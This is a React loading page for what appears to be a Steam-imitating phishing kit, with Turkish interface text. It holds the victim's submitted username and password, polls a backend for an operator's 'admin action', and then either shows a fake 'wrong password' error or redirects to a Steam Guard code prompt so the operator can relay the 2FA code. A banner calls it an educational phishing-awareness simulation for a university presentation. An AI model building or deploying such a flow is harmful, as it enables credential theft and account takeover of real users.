
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Loader } from 'lucide-react';
import { toast } from 'sonner';
import { Progress } from '@/components/ui/progress';

const LoadingPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const credentials = location.state || { username: '', password: '' };

  // Set up WebSocket connection to listen for admin commands
  useEffect(() => {
    // This is a mock websocket - in a real app, you'd use a real WebSocket
    const mockWebSocket = {
      onmessage: null,
      close: () => {}
    };

    // For the demo, we'll use polling instead of WebSockets
    const checkAdminActions = setInterval(() => {
      // Mock API fetch to check for admin actions
      fetch('/api/check-admin-action?username=' + credentials.username)
        .then(res => res.json())
        .then(data => {
          if (data.action === 'retry') {
            // Admin clicked "Retry"
            clearInterval(checkAdminActions);
            toast.error("Hesap adı veya parola yanlış");
            setTimeout(() => navigate('/'), 2000);
          } else if (data.action === 'steam-guard') {
            // Admin clicked "Ask for Steam Guard"
            clearInterval(checkAdminActions);
            navigate('/steam-guard');
          }
        })
        .catch(err => {
          console.error("Demo error checking admin actions:", err);
        });
    }, 3000); // Check every 3 seconds

    // Simulate progress bar
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 95) {
          return 95; // Keep at 95% until action is taken
        }
        return prev + 5;
      });
    }, 1000);

    return () => {
      mockWebSocket.close();
      clearInterval(checkAdminActions);
      clearInterval(progressInterval);
    };
  }, [credentials, navigate]);

  return (
    <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
      <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full text-center">
        <Loader className="animate-spin h-12 w-12 text-blue-400 mx-auto mb-4" />
        <h1 className="text-xl font-bold text-white mb-2">Giriş Yapılıyor</h1>
        <p className="text-white/70 mb-6">Steam hesabınıza bağlanılıyor, lütfen bekleyin...</p>
        
        <div className="w-full mb-6">
          <Progress value={progress} className="h-2 bg-[#32353c]" />
          <p className="text-xs text-white/50 mt-1 text-right">{progress}%</p>
        </div>
        
        <div className="bg-red-500/20 border border-red-500/40 p-3 rounded mt-6">
          <p className="text-xs text-white/90">
            <span className="font-bold">Eğitim Amaçlı Simülasyon:</span> Bu sayfa, bir üniversite sunumu için phishing farkındalığı oluşturmak amacıyla tasarlanmıştır.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoadingPage;
